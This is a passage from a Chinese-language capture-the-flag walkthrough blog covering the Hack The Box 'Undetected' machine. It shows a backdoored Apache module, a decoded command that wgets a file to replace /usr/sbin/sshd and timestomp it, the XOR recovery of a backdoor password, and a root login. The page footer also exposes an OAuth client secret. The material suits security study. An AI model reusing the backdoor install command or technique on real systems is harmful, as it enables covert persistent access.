+        for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT
+Received: (from root@localhost)
+        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
+        Sun, 25 Jul 2021 10:31:12 GMT
+Date: Sun, 25 Jul 2021 10:31:12 GMT
+Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;
+To: steven@production
+From: root@production
+Subject: Investigations
+
+Hi Steven.
+
+We recently updated the system but are still experiencing some strange behaviour with the Apache service.
+We have temporarily moved the web store and database to another server whilst investigations are underway.
+If for any reason you need access to the database or web application code, get in touch with Mark and he
+will generate a temporary password for you to authenticate to the temporary server.
+
+Thanks,
+sysadmin
+</code></pre>
+<p>这里大概意思是说最近更新了一下系统，但是在apache上有点奇怪的问题，所以暂时把商城和数据库搬迁到另一台服务器上了，正在排查原因，如果我们需要访问的话可以联系Mark，他会给我们一个临时密码的</p>
+<p>这里我猜测应该是做邮件伪造了</p>
+<p>不过我们还是先去看看apache服务吧</p>
+<p>apache服务目录位于&#x2F;usr&#x2F;lib</p>
+<pre><code class="bash">steven@production:~$ ls -la /usr/lib/apache2/
+total 28
+drwxr-xr-x  3 root root  4096 Jul  5  2021 .
+drwxr-xr-x 82 root root  4096 Feb  8 19:59 ..
+drwxr-xr-x  2 root root 20480 Jan 28 21:05 modules
+</code></pre>
+<p>我们对这个目录有读取和执行权限，还不错，去看看</p>
+<pre><code class="bash">steven@production:/usr/lib/apache2/modules$ ls -la
+total 8796
+drwxr-xr-x 2 root root   20480 Jan 28 21:05 .
+drwxr-xr-x 3 root root    4096 Jul  5  2021 ..
+-rw-r--r-- 1 root root   15925 Jan  5 14:49 httpd.exp
+-rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_access_compat.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_actions.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_alias.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_allowmethods.so
+-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_asis.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_auth_basic.so
+-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_auth_digest.so
+-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_auth_form.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_anon.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_core.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_dbd.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_dbm.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_file.so
+-rw-r--r-- 1 root root   22768 Jan  5 14:49 mod_authn_socache.so
+-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_authnz_fcgi.so
+-rw-r--r-- 1 root root   55528 Jan  5 14:49 mod_authnz_ldap.so
+-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_authz_core.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_dbd.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_dbm.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_groupfile.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_host.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_owner.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_user.so
+-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_autoindex.so
+-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_brotli.so
+-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_bucketeer.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_buffer.so
+-rw-r--r-- 1 root root   80176 Jan  5 14:49 mod_cache.so
+-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_cache_disk.so
+-rw-r--r-- 1 root root   39152 Jan  5 14:49 mod_cache_socache.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_case_filter.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_case_filter_in.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_cern_meta.so
+-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_cgi.so
+-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_cgid.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_charset_lite.so
+-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_data.so
+-rw-r--r-- 1 root root  104656 Jan  5 14:49 mod_dav.so
+-rw-r--r-- 1 root root   59600 Jan  5 14:49 mod_dav_fs.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_dav_lock.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_dbd.so
+-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_deflate.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dialup.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dir.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dumpio.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_echo.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_env.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_expires.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_ext_filter.so
+-rw-r--r-- 1 root root   14592 Jan  5 14:49 mod_file_cache.so
+-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_filter.so
+-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_headers.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_heartbeat.so
+-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_heartmonitor.so
+-rw-r--r-- 1 root root  253632 Jan  5 14:49 mod_http2.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ident.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_imagemap.so
+-rw-r--r-- 1 root root   55504 Jan  5 14:49 mod_include.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_info.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_bybusyness.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_byrequests.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_bytraffic.so
+-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_lbmethod_heartbeat.so
+-rw-r--r-- 1 root root   84176 Jan  5 14:49 mod_ldap.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_log_debug.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_log_forensic.so
+-rw-r--r-- 1 root root  134544 Jan  5 14:49 mod_lua.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_macro.so
+-rw-r--r-- 1 root root  260672 Jan  5 14:49 mod_md.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_mime.so
+-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_mime_magic.so
+-rw-r--r-- 1 root root   67792 Jan  5 14:49 mod_mpm_event.so
+-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_mpm_prefork.so
+-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_mpm_worker.so
+-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_negotiation.so
+-rw-r--r-- 1 root root  133888 Jan  5 14:49 mod_proxy.so
+-rw-r--r-- 1 root root   55504 Jan  5 14:49 mod_proxy_ajp.so
+-rw-r--r-- 1 root root   59600 Jan  5 14:49 mod_proxy_balancer.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_proxy_connect.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_proxy_express.so
+-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_proxy_fcgi.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_proxy_fdpass.so
+-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_proxy_ftp.so
+-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_proxy_hcheck.so
+-rw-r--r-- 1 root root   39152 Jan  5 14:49 mod_proxy_html.so
+-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_proxy_http.so
+-rw-r--r-- 1 root root   67936 Jan  5 14:49 mod_proxy_http2.so
+-rw-r--r-- 1 root root   22768 Jan  5 14:49 mod_proxy_scgi.so
+-rw-r--r-- 1 root root   22656 Jan  5 14:49 mod_proxy_uwsgi.so
+-rw-r--r-- 1 root root   18560 Jan  5 14:49 mod_proxy_wstunnel.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ratelimit.so
+-rw-r--r-- 1 root root   34800 May 17  2021 mod_reader.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_reflector.so
+-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_remoteip.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_reqtimeout.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_request.so
+-rw-r--r-- 1 root root   75984 Jan  5 14:49 mod_rewrite.so
+-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_sed.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_session.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_session_cookie.so
+-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_session_crypto.so
+-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_session_dbd.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_setenvif.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_slotmem_plain.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_slotmem_shm.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_dbm.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_memcache.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_redis.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_socache_shmcb.so
+-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_speling.so
+-rw-r--r-- 1 root root  248240 Jan  5 14:49 mod_ssl.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_status.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_substitute.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_suexec.so
+-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_unique_id.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_userdir.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_usertrack.so
+-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_vhost_alias.so
+-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_xml2enc.so
+</code></pre>
+<p>文件有点多啊，那么稍微筛选一下，按照最近修改来排序</p>
+<pre><code class="bash">steven@production:/usr/lib/apache2/modules$ ls --full-time -i | sort -u
+ 2050 -rw-r--r-- 1 root root   34800 2021-05-17 07:10:04.000000000 +0000 mod_reader.so
+</code></pre>
+<p>就是这个文件了，我们把它下载下来看看</p>
+<pre><code class="bash">scp steven1@10.10.11.146:/usr/lib/apache2/modules/mod_reader.so ~/Desktop
+</code></pre>
+<p>下载下来后，在mod_reader.so中提取到一段base64码</p>
+<pre><code class="bash">d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
+</code></pre>
+<p>给解析一下</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# echo -n &#39;d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk&#39; | base64 -d
+wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
+</code></pre>
+<p>这边是把这张图片传输到sshd，去下载下来</p>
+<p>使用ghidra打开进行逆向</p>
+
+
+<p>从这里可以看出来，我们的密码是31位</p>
+<pre><code class="bash">backdoor._28_2_ = 0xa9f4;
+backdoor._24_4_ = 0xbcf0b5e3;
+backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
+backdoor[30] = -0x5b;
+backdoor._0_4_ = 0xf0e7abd6;
+backdoor._4_4_ = 0xa4b3a3f3;
+backdoor._8_4_ = 0xf7bbfdc8;
+backdoor._12_4_ = 0xfdb3d6e7;
+</code></pre>
+<p>我们给它排序一下，从高到低排序</p>
+<pre><code class="bash">backdoor[30] = -0x5b;
+backdoor._28_2_ = 0xa9f4;
+backdoor._24_4_ = 0xbcf0b5e3;
+backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
+backdoor._12_4_ = 0xfdb3d6e7;
+backdoor._8_4_ = 0xf7bbfdc8;
+backdoor._4_4_ = 0xa4b3a3f3;
+backdoor._0_4_ = 0xf0e7abd6;
+</code></pre>
+<pre><code class="bash">0x5b
+0xa9f4
+0xbcf0b5e3
+0xb2d6f4a0fda0b3d6
+0xfdb3d6e7
+0xf7bbfdc8
+0xa4b3a3f3
+0xf0e7abd6
+</code></pre>
+<p>这边排序好以后，右键查看一下0x5b</p>
+
+
+<p>发现正确的应该是0xa5，修改一下后去做一下编码</p>
+<p>首先转化成HEX再转化为XOR</p>
+<blockquote>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=Swap_endianness(' target=" _blank" rel="noopener" hex',31,true)from_hex('auto')xor(%7b'option':'hex','string':'96'%7d,'standard',false)&input="MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg"">https://gchq.github.io/CyberChef/#recipe=Swap_endianness(‘Hex’,31,true)From_Hex(‘Auto’)XOR({‘option’:’Hex’,’string’:’96’},’Standard’,false)&amp;input&#x3D;MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg</a></p>
+</blockquote>
+<p>这是最终改出来的效果，点开即可看到我的结果</p>
+<pre><code class="bash">0xa5
+0xa9f4
+0xbcf0b5e3
+0xb2d6f4a0fda0b3d6
+0xfdb3d6e7
+0xf7bbfdc8
+0xa4b3a3f3
+0xf0e7abd6
+</code></pre>
+<pre><code class="bash">@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
+</code></pre>
+<p>得到了backdoor的密码</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh root@10.10.11.146                                   
+The authenticity of host &#39;10.10.11.146 (10.10.11.146)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:2jPT4mThqEcnA/qjjQsIWwy2QNwGObWQX5MjK5YNvCM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.146&#39; (ECDSA) to the list of known hosts.
+root@10.10.11.146&#39;s password: 
+Last login: Fri Feb 25 12:56:49 2022 from 10.10.14.76
+root@production:~# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功提权到root</p>
+<pre><code class="bash">root@production:~# ls
+root.txt
+root@production:~# cat root.txt 
+4a243e1e3ccb05dbcd7a29abb49d3bcf
+</code></pre>
+<p>成功拿到root的flag文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/&title=《Undetected - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/&title=《Undetected - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Undetected - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Lame - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Meta - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/&title=《Undetected - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/&title=《Undetected - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Undetected - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACwUlEQVR42u3aQW7jMBAEQP//01lgTwGykruHpBxgiycjdhQVA2jGPXy94vX1d31//X39/MzVT+4/ef/zq6ttWHh4eHijW79aV7yEen/NK1h+P8n18fDw8M7xkmJwgnePTN59Y8HDw8P7KC/H5A16Uh7utxgPDw/vN/OS+OD+mjk4L054eHh4n+LNvvwnzXHyt5I7OZ614OHh4XVpQD0A++zr4/M9PDw8vNFUvV2zh3seUtT3g4eHh3eAlzTBebw7C23vkW28+2p7fDw8PLySl/9yO9Rfv3K7Hf+4Dh4eHt4x3so4atZSt411Ut8um2k8PDy8R3izgGB2+CA/tpWUlvr8Ah4eHl7Ja+OJuqktDw0kJWcDFQ8PD28rr22C1yPg2SGGpMzg4eHhneCdC1LbgKNtzYf1DQ8PD2+Zlzyy9wYK+dhsVjYutxIPDw9vE292c3k0kMTBs3ejSAIPDw/vAK8dd60cJlgpDPlrPDw8vCd5KwcCkmg138q28BT/Nzw8PLxNvOQxPQttkyusF4M3d4WHh4d3gNeOo/JH/yy8yAtSfrAADw8PbxdvNqpvm+/1EDZv3PHw8PCe4c3GV7MTCrODWW0k8Zrlynh4eHjlt/X8cTyLIZLSkq96E/Hw8PA28WZxQBv75hsxY7zJp/Hw8PC28lbG+XmgsP7o35xS4+Hh4W3itZ14UiTagVYL21YS8PDw8EYnkfK2NW/E8wLQRhjFvwoPDw/vMC9vixNA21K/Ni08PDy8c7xZQJA30MkhqrwRr5t4PDw8vAO8leNTK4HF6fZ9rVDi4eHhpbOhXcUg2ZTZu3lhwMPDw3uGtzJ2mjXlyVauly48PDy838Brjz21B7nywwTRXeHh4eF9lLe+EXkBmEXAeHh4eE/y9jbBs6HXkYYbDw8P79R3+W0DsLzJTsKOtnE/Pt/Dw8P733l/AEhuu2DZQSGdAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
